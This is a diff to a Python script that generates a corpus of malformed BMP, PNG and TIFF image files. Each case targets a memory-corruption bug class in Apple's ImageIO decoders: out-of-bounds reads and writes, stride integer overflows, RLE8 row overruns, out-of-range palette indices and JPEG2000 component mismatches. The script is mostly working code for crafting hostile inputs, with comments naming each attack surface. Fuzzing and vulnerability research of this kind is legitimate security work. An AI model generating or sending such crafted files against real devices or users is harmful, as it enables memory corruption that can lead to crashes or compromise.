@@ -27,6 +27,7 @@ import os
 import sys
 import subprocess
 import argparse
+import zlib
 
 # ========================== TIFF/DNG constants ==========================
 
@@ -73,6 +74,8 @@ TY_SRATIONAL = 10
 
 COMP_UNCOMPRESSED  = 1
 COMP_JPEG_LOSSLESS = 7
+COMP_LZW           = 5
+COMP_DEFLATE       = 32946   # TIFF Deflate/ZIP (also 8 = standard Deflate)
 COMP_JPEG2000      = 34712
 COMP_JPEG_LS       = 34892
 
@@ -676,6 +679,261 @@ def build_dng(width=64, height=64, spp=3, inner_comps=1,
     return data
 
 
+# ========================== BMP builder ==========================
+
+def build_bmp(width, height, bpp=24, bi_size_image_override=None):
+    """
+    BMP file for biSizeImage mismatch and large-dimension overflow testing.
+
+    bi_size_image_override: if set, biSizeImage is declared as this value while
+      width*height*bpp/8 is much larger. A decoder that trusts biSizeImage for
+      bounds checking but reads width*height pixels will OOB read past the buffer.
+
+    Large width/height: stride = ((w*bpp+31)//32)*4 may overflow 32-bit arithmetic
+      in Apple's BMPImagePlugin, causing under-allocation followed by OOB write.
+    """
+    BMFH = 14
+    BMIH = 40
+
+    palette = b''
+    if bpp <= 8:
+        n_colors = 1 << bpp
+        palette = b''.join(
+            struct.pack('<BBBB', i * 255 // max(n_colors - 1, 1),
+                                 i * 255 // max(n_colors - 1, 1),
+                                 i * 255 // max(n_colors - 1, 1), 0)
+            for i in range(n_colors)
+        )
+
+    pix_offset = BMFH + BMIH + len(palette)
+    stride = ((abs(width) * bpp + 31) // 32) * 4
+    true_pix_size = stride * abs(height)
+
+    # Include pixel data up to 64 KB — enough for valid CTRL cases (typically < 16KB)
+    # but small enough that large-width attack cases don't actually generate GB files.
+    # The decoder will OOB-read/write when it tries to process width*height pixels beyond
+    # the small actual data in the file.
+    pixel_data = bytes(min(true_pix_size, 65536))
+    declared_size = bi_size_image_override if bi_size_image_override is not None else 0
+    file_size = pix_offset + len(pixel_data)
+
+    bfh = b'BM' + struct.pack('<IHHI', file_size, 0, 0, pix_offset)
+    # biHeight positive = bottom-up (standard)
+    bih = struct.pack('<IiiHHIIiiII',
+        BMIH, width, abs(height), 1, bpp, 0, declared_size, 0, 0, 0, 0)
+    return bfh + bih + palette + pixel_data
+
+
+def build_bmp_rle8_overflow(width=64, height=64, extra_rows=4):
+    """
+    BMP with BI_RLE8 compression (biCompression=1) where the encoded RLE stream
+    contains extra_rows rows beyond the declared height.
+
+    The decoder allocates width*height pixels. If it processes the RLE stream until
+    the End-of-Bitmap marker without checking against the declared height,
+    it writes extra_rows*width bytes past the end of the output buffer (OOB write).
+
+    Attack surface: Apple's BI_RLE8 decoder in BMPImagePlugin.
+    """
+    BMFH = 14
+    BMIH = 40
+
+    # Full 256-entry palette required for RLE8
+    palette = b''.join(struct.pack('<BBBB', i, i, i, 0) for i in range(256))
+    pix_offset = BMFH + BMIH + len(palette)
+
+    # Craft RLE8 stream encoding (height + extra_rows) rows of pixels.
+    # RLE8 encoded-mode: [count, pixel_value]  — repeat count times.
+    # Escape-mode: [0,0]=EOL, [0,1]=EOB, [0,2,dx,dy]=delta, [0,n,...]=absolute.
+    rle = bytearray()
+    for _ in range(height + extra_rows):
+        remaining = width
+        while remaining > 0:
+            run = min(remaining, 255)
+            rle += bytes([run, 0x80])   # run of 'run' pixels, value=128 (mid-gray)
+            remaining -= run
+        rle += bytes([0, 0])            # End of Line
+    rle += bytes([0, 1])                # End of Bitmap
+
+    declared_size = len(rle)
+    file_size = pix_offset + declared_size
+
+    bfh = b'BM' + struct.pack('<IHHI', file_size, 0, 0, pix_offset)
+    bih = struct.pack('<IiiHHIIiiII',
+        BMIH, width, height, 1, 8, 1, declared_size, 0, 0, 0, 0)
+    return bfh + bih + palette + bytes(rle)
+
+
+# ========================== PNG builder ==========================
+
+def _png_chunk(ctype, data):
+    data = bytes(data)
+    crc = zlib.crc32(ctype + data) & 0xFFFFFFFF
+    return struct.pack('>I', len(data)) + ctype + data + struct.pack('>I', crc)
+
+PNG_SIG = b'\x89PNG\r\n\x1a\n'
+
+
+def build_png_palette_oob(width=64, height=64, palette_entries=4, oob_index=200):
+    """
+    PNG color type 3 (indexed) with pixel indices beyond PLTE size.
+
+    palette_entries: number of RGB triples in PLTE.
+    oob_index: pixel value used throughout the image. If oob_index >= palette_entries,
+      a decoder that does a direct palette lookup without bounds checking will read:
+        color = PLTE_ptr[oob_index * 3]  (past end of PLTE buffer → OOB read)
+
+    Attack surface: Apple's PNG decoder palette expansion path.
+    libpng clamps/errors but Apple may use a custom decoder or unpatched libpng.
+    """
+    ihdr = _png_chunk(b'IHDR',
+        struct.pack('>II', width, height) + bytes([8, 3, 0, 0, 0]))
+
+    plte_data = bytes([c for i in range(palette_entries)
+                       for c in (i * 17 % 256, i * 31 % 256, i * 47 % 256)])
+    plte = _png_chunk(b'PLTE', plte_data)
+
+    oob = min(max(oob_index, 0), 255)
+    raw = b''.join(b'\x00' + bytes([oob] * width) for _ in range(height))
+    idat = _png_chunk(b'IDAT', zlib.compress(raw))
+    iend = _png_chunk(b'IEND', b'')
+
+    return PNG_SIG + ihdr + plte + idat + iend
+
+
+def build_png_dimension_mismatch(declared_width=4096, declared_height=4096,
+                                  actual_rows=4, color_type=2):
+    """
+    PNG where IHDR declares large dimensions but IDAT only contains a few rows.
+
+    The zlib stream is valid but shorter than (declared_width*channels + 1)*declared_height.
+    A decoder that:
+      1. allocates declared_width*declared_height*channels bytes upfront, then
+      2. decompresses the stream, then
+      3. processes all declared_height rows using row-filter reconstruction
+    will run off the end of the decompressed buffer at step 3, reading uninit/OOB memory
+    for the missing rows.
+
+    color_type: 2=RGB (3 bytes/pixel), 0=gray (1 byte/pixel), 6=RGBA (4 bytes/pixel)
+    """
+    channels = {0: 1, 2: 3, 3: 1, 4: 2, 6: 4}.get(color_type, 3)
+
+    ihdr = _png_chunk(b'IHDR',
+        struct.pack('>II', declared_width, declared_height) +
+        bytes([8, color_type, 0, 0, 0]))
+
+    # Only encode actual_rows rows — deliberately truncated
+    raw = b''.join(
+        b'\x00' + bytes([128] * declared_width * channels)
+        for _ in range(actual_rows)
+    )
+    idat = _png_chunk(b'IDAT', zlib.compress(raw))
+    iend = _png_chunk(b'IEND', b'')
+
+    return PNG_SIG + ihdr + idat + iend
+
+
+def build_png_text_chunk_overflow(width=8, height=8):
+    """
+    PNG with a tEXt/zTXt chunk declaring an enormous length in the chunk header
+    but providing only a few bytes of actual data.
+
+    Chunk format: [length: 4B BE] [type: 4B] [data: length B] [crc: 4B]
+    If a non-IDAT chunk parser trusts the declared length and tries to:
+      a) allocate length bytes to buffer the chunk data, or
+      b) seek/skip length bytes from the current stream position
+    — and length is 0x7FFFFFFF — the result is OOM crash or stream OOB read.
+
+    CRC is intentionally wrong (data is shorter than declared); parsers that
+    skip CRC validation on non-critical chunks will attempt to process.
+    """
+    # Valid IHDR + tiny IDAT for a real 8x8 RGB image
+    ihdr = _png_chunk(b'IHDR',
+        struct.pack('>II', width, height) + bytes([8, 2, 0, 0, 0]))
+    raw = b''.join(b'\x00' + bytes([128] * width * 3) for _ in range(height))
+    idat = _png_chunk(b'IDAT', zlib.compress(raw))
+    iend = _png_chunk(b'IEND', b'')
+
+    # Malicious tEXt chunk: declare 2GB length, provide only 12 bytes of data
+    # CRC is computed over actual 12 bytes (wrong for declared 2GB length)
+    actual_data = b'Comment\x00Overflow'
+    bad_len = 0x7FFFFFFF
+    crc = zlib.crc32(b'tEXt' + actual_data) & 0xFFFFFFFF
+    bad_text_chunk = struct.pack('>I', bad_len) + b'tEXt' + actual_data + struct.pack('>I', crc)
+
+    return PNG_SIG + ihdr + bad_text_chunk + idat + iend
+
+
+# ========================== TIFF + Deflate builder ==========================
+
+def build_tiff_deflate_overflow(width=64, height=64, spp=3, bits=8, extra_bytes=0):
+    """
+    TIFF with Deflate/ZIP compression (compression=32946).
+
+    Strip data decompresses to width*height*spp*(bits//8) + extra_bytes bytes.
+    A decoder that:
+      1. allocates exactly width*height*spp*(bits//8) for the output buffer, then
+      2. decompresses the strip without capping output at the buffer size
+    will write extra_bytes past the end of the output buffer (OOB write).
+
+    CTRL: extra_bytes=0 (exact size). Mismatch: extra_bytes = 1MB, 16MB, etc.
+    Attack surface: Apple's TIFF Deflate strip decoder in ImageIO.framework.
+    """
+    expected = width * height * spp * (bits // 8)
+    compressed = zlib.compress(bytes(expected + extra_bytes))
+
+    b = TiffBuilder()
+    b.add_long(T_IMAGE_WIDTH, width)
+    b.add_long(T_IMAGE_LENGTH, height)
+    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
+    b.add_short(T_COMPRESSION, COMP_DEFLATE)
+    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
+    b.add_short(T_SAMPLES_PER_PIXEL, spp)
+    b.add_long(T_ROWS_PER_STRIP, height)
+    b.add_short(T_PLANAR_CONFIG, 1)
+    b.add_short(T_RESOLUTION_UNIT, 2)
+    b.add_rational(T_X_RESOLUTION, 72, 1)
+    b.add_rational(T_Y_RESOLUTION, 72, 1)
+    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, compressed)
+    return b.build()
+
+
+# ========================== Plain TIFF + JPEG2000 builder ==========================
+
+def build_plain_tiff_j2k(width=64, height=64, spp=3, inner_csiz=None):
+    """
+    Plain TIFF (no DNG tags) with JPEG2000 compression (compression=34712).
+
+    NOT a DNG — no CFA/LinearRaw photometric → no Camera Raw routing.
+    This exercises the TIFF plugin's J2K sub-decoder (if Apple implements it).
+
+    inner_csiz: Csiz field in SIZ marker (inner component count).
+    Mismatch: spp=3 outer, inner_csiz=1 → if decoder uses Csiz for output loop
+    but allocated spp*width*height buffer → OOB read.
+    Reverse: spp=1 outer, inner_csiz=3 → OOB write.
+
+    Attack surface: potential TIFF+J2K decoder distinct from DNG+Camera Raw.
+    """
+    if inner_csiz is None:
+        inner_csiz = spp
+
+    b = TiffBuilder()
+    b.add_long(T_IMAGE_WIDTH, width)
+    b.add_long(T_IMAGE_LENGTH, height)
+    b.add_short_array(T_BITS_PER_SAMPLE, [16] * spp)
+    b.add_short(T_COMPRESSION, COMP_JPEG2000)
+    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
+    b.add_short(T_SAMPLES_PER_PIXEL, spp)
+    b.add_long(T_ROWS_PER_STRIP, height)
+    b.add_short(T_PLANAR_CONFIG, 1)
+    b.add_short(T_RESOLUTION_UNIT, 2)
+    b.add_rational(T_X_RESOLUTION, 72, 1)
+    b.add_rational(T_Y_RESOLUTION, 72, 1)
+    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS,
+                build_j2k(width, height, csiz=inner_csiz, bits=16))
+    return b.build()
+
+
 # ========================== Corpus ==========================
 
 # (width, height, spp, inner_comps, bits, codec, name, photometric)
@@ -934,6 +1192,135 @@ def generate_corpus(outdir='corpus'):
                    photometric=PHOTO_LINEAR_RAW, camera_model=CANON_R5)),
     ]
     for name, data in real_cam_cases:
+        fname = os.path.join(outdir, f'{name}.dng')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- NEW TARGET: BMP overflow / biSizeImage mismatch ----
+    # Apple's BMPImagePlugin in ImageIO.framework — rarely audited for mismatch bugs.
+    # BI_RGB mismatch: biSizeImage declares tiny size while width*height*bpp/8 is large.
+    # BI_RLE8 OOB: RLE stream encodes extra rows beyond declared biHeight.
+    bmp_cases = [
+        # CTRL: valid small BMP (confirm CGImageSource accepts BMP and the path is reachable)
+        ('CTRL_bmp_rgb24_64x64',
+         build_bmp(64, 64, bpp=24)),
+        ('CTRL_bmp_gray8_64x64',
+         build_bmp(64, 64, bpp=8)),
+        # biSizeImage=4 but actual data needs 4096*4096*4 = 64MB (OOB read on decode)
+        ('bmp_size_mismatch_4096x4096_32bpp',
+         build_bmp(4096, 4096, bpp=32, bi_size_image_override=4)),
+        # Large width: stride = ((0x15555556*24+31)//32)*4 overflows 32-bit at 0x15555556*24
+        ('bmp_bigwidth_rgb24_1row',
+         build_bmp(0x15555556, 1, bpp=24)),
+        # Large width: 8-bit stride overflow
+        ('bmp_bigwidth_gray8_1row',
+         build_bmp(0x40000001, 1, bpp=8)),
+        # biSizeImage=0 (auto), width/height large → correct stride but tiny pixel data in file
+        ('bmp_big_dims_no_data',
+         build_bmp(0x10000, 0x10000, bpp=32, bi_size_image_override=0)),
+        # BI_RLE8: RLE stream encodes height+4 rows, biHeight=64 → OOB write of 64*4=256 bytes
+        ('CTRL_bmp_rle8_64x64',
+         build_bmp_rle8_overflow(64, 64, extra_rows=0)),
+        ('bmp_rle8_overflow_4rows',
+         build_bmp_rle8_overflow(64, 64, extra_rows=4)),
+        ('bmp_rle8_overflow_64rows',
+         build_bmp_rle8_overflow(64, 64, extra_rows=64)),
+        ('bmp_rle8_overflow_256rows',
+         build_bmp_rle8_overflow(256, 256, extra_rows=256)),
+    ]
+    print('\n[*] NEW TARGET: BMP overflow / biSizeImage mismatch / BI_RLE8 OOB:')
+    for name, data in bmp_cases:
+        fname = os.path.join(outdir, f'{name}.bmp')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- NEW TARGET: PNG palette OOB / dimension mismatch ----
+    # Apple's PNGImagePlugin — covers both libpng and any custom post-processing.
+    # Palette OOB: PLTE has N entries, pixel data uses indices >> N-1.
+    # Dimension mismatch: IHDR declares large image, IDAT compressed stream is tiny.
+    png_cases = [
+        # CTRL: valid 256-color indexed PNG (confirm PNG path is reachable)
+        ('CTRL_png_indexed_256color',
+         build_png_palette_oob(64, 64, palette_entries=256, oob_index=100)),
+        # OOB READ: 4-entry PLTE but pixels use index 200 (200 × 3 = byte 600 in 12-byte PLTE)
+        ('png_palette_oob_4ent_idx200',
+         build_png_palette_oob(64, 64, palette_entries=4, oob_index=200)),
+        ('png_palette_oob_4ent_idx255',
+         build_png_palette_oob(256, 256, palette_entries=4, oob_index=255)),
+        # OOB READ: 1-entry PLTE (3 bytes), pixel index 255 → 765 bytes past PLTE start
+        ('png_palette_oob_1ent_idx255',
+         build_png_palette_oob(64, 64, palette_entries=1, oob_index=255)),
+        # Dimension mismatch: IHDR=4096x4096 RGB, IDAT only has 4 rows
+        # Row-filter reconstruction at row 5+ reads past decompressed buffer
+        ('png_dim_mismatch_4096x4096_4rows',
+         build_png_dimension_mismatch(4096, 4096, actual_rows=4, color_type=2)),
+        ('png_dim_mismatch_1024x1024_1row',
+         build_png_dimension_mismatch(1024, 1024, actual_rows=1, color_type=2)),
+        # Dimension mismatch with grayscale (1-channel, less data → larger relative OOB)
+        ('png_dim_mismatch_4096x4096_gray_4rows',
+         build_png_dimension_mismatch(4096, 4096, actual_rows=4, color_type=0)),
+        # tEXt chunk with declared length 0x7FFFFFFF (OOM/stream-OOB attack)
+        ('png_text_chunk_2gb_declared',
+         build_png_text_chunk_overflow(8, 8)),
+    ]
+    print('\n[*] NEW TARGET: PNG palette OOB / dimension mismatch / text chunk overflow:')
+    for name, data in png_cases:
+        fname = os.path.join(outdir, f'{name}.png')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- NEW TARGET: TIFF + Deflate decompressed size overflow ----
+    # TIFF strip with Deflate (compression=32946).
+    # CTRL: decompressed size == width*height*spp*bps/8 (exact match).
+    # Attack: strip decompresses to more data than declared image size.
+    # A decoder that decompresses without capping output writes past the output buffer.
+    deflate_cases = [
+        ('CTRL_tiff_deflate_64x64_3spp',
+         build_tiff_deflate_overflow(64, 64, spp=3, extra_bytes=0)),
+        ('CTRL_tiff_deflate_64x64_1spp',
+         build_tiff_deflate_overflow(64, 64, spp=1, extra_bytes=0)),
+        # OOB WRITE: decompressed data overflows output buffer by 1MB
+        ('tiff_deflate_overflow_1mb',
+         build_tiff_deflate_overflow(64, 64, spp=3, extra_bytes=1 * 1024 * 1024)),
+        ('tiff_deflate_overflow_4mb',
+         build_tiff_deflate_overflow(64, 64, spp=3, extra_bytes=4 * 1024 * 1024)),
+        ('tiff_deflate_overflow_16mb',
+         build_tiff_deflate_overflow(64, 64, spp=3, extra_bytes=16 * 1024 * 1024)),
+        # Larger image base with overflow (wider OOB region, less likely to be caught early)
+        ('tiff_deflate_256x256_overflow_4mb',
+         build_tiff_deflate_overflow(256, 256, spp=3, extra_bytes=4 * 1024 * 1024)),
+    ]
+    print('\n[*] NEW TARGET: TIFF + Deflate decompressed size overflow:')
+    for name, data in deflate_cases:
+        fname = os.path.join(outdir, f'{name}.dng')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- NEW TARGET: Plain TIFF + JPEG2000 (compression=34712) SPP/Csiz mismatch ----
+    # No DNG tags → no Camera Raw routing. Tests the TIFF plugin's J2K sub-decoder.
+    # If Apple supports TIFF+J2K, a Csiz mismatch is the same bug class as CVE-2025-43300.
+    plain_j2k_cases = [
+        ('CTRL_plain_tiff_j2k_3spp_3csiz',
+         build_plain_tiff_j2k(64, 64, spp=3, inner_csiz=3)),
+        ('CTRL_plain_tiff_j2k_1spp_1csiz',
+         build_plain_tiff_j2k(64, 64, spp=1, inner_csiz=1)),
+        # OOB READ: spp=3 outer, Csiz=1 inner
+        ('plain_tiff_j2k_3spp_1csiz',
+         build_plain_tiff_j2k(64, 64, spp=3, inner_csiz=1)),
+        ('plain_tiff_j2k_3spp_1csiz_256',
+         build_plain_tiff_j2k(256, 256, spp=3, inner_csiz=1)),
+        # OOB WRITE: spp=1 outer, Csiz=3 inner
+        ('plain_tiff_j2k_1spp_3csiz',
+         build_plain_tiff_j2k(64, 64, spp=1, inner_csiz=3)),
+        ('plain_tiff_j2k_1spp_4csiz',
+         build_plain_tiff_j2k(64, 64, spp=1, inner_csiz=4)),
+    ]
+    print('\n[*] NEW TARGET: Plain TIFF + JPEG2000 SPP/Csiz mismatch (no Camera Raw):')
+    for name, data in plain_j2k_cases:
         fname = os.path.join(outdir, f'{name}.dng')
         with open(fname, 'wb') as f:
             f.write(data)
